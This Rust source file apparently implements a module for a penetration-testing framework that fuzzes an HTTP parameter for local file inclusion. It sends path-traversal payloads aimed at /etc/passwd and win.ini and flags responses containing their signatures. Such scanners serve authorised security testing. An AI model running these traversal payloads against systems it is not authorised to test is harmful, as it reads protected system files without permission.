use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use nxc_protocols::{http::HttpSession, NxcSession};
use serde_json::json;
use tracing::info;

pub struct LfiFuzzer {}

impl LfiFuzzer {
    pub fn new() -> Self {
        Self {}
    }
}

impl Default for LfiFuzzer {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for LfiFuzzer {
    fn name(&self) -> &'static str {
        "lfi_fuzzer"
    }

    fn description(&self) -> &'static str {
        "Tests URL parameters for Local File Inclusion (LFI) and Path Traversal."
    }

    fn supported_protocols(&self) -> &[&str] {
        &["http"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "PATH".to_string(),
                description: "Endpoint to test (e.g. /download?file=)".to_string(),
                required: true,
                default: None,
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let http_sess = session
            .as_any_mut()
            .downcast_mut::<HttpSession>()
            .ok_or_else(|| anyhow!("Module requires an HTTP session"))?;

        let scheme = if http_sess.use_ssl { "https" } else { "http" };
        let base_path = opts.get("PATH").ok_or_else(|| anyhow!("PATH is required"))?;
        let url = format!("{}://{}:{}{}", scheme, http_sess.target, http_sess.port, base_path);
        
        info!("Starting LFI Fuzzing against target parameter block {}", url);

        let payloads = vec![
            "../../../../../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "../../../../../../../../../../windows/win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "../../../../../../../../../../etc/passwd%00",
            "/etc/passwd",
            "C:\\windows\\win.ini",
        ];

        let mut output = String::from("LFI Fuzzing Results:\n");
        let mut results = Vec::new();
        let mut test_success = false;

        for payload in payloads {
            let test_url = format!("{}{}", url, payload);
            let mut req = http_sess.client.get(&test_url);
            
            if let Some(creds) = &http_sess.credentials {
                if let Some(pw) = &creds.password {
                    req = req.basic_auth(&creds.username, Some(pw));
                } else {
                    req = req.basic_auth(&creds.username, None::<&str>);
                }
            }

            if let Ok(res) = req.send().await {
                if let Ok(body) = res.text().await {
                    let mut found = false;
                    let mut match_type = "";

                    // Linux passwd signature
                    if body.contains("root:x:0:0:") || body.contains("daemon:x:1:1:") {
                        found = true;
                        match_type = "Linux /etc/passwd";
                    }
                    // Windows win.ini signature
                    else if body.contains("[extensions]") || body.contains("[fonts]") || body.contains("[files]") {
                        found = true;
                        match_type = "Windows win.ini";
                    }

                    if found {
                        test_success = true;
                        output.push_str(&format!("  [!] VULNERABLE to Path Traversal!\n"));
                        output.push_str(&format!("      Payload: {}\n", payload));
                        output.push_str(&format!("      Match  : {}\n", match_type));
                        
                        results.push(json!({
                            "payload": payload,
                            "match": match_type
                        }));
                    }
                }
            }
        }

        if !test_success {
            output.push_str("  [-] No Local File Inclusion signatures detected.\n");
        }

        Ok(ModuleResult {
            success: test_success,
            output,
            data: json!({ "lfi_vulnerable": test_success, "matches": results }),
            credentials: vec![],
        })
    }
}
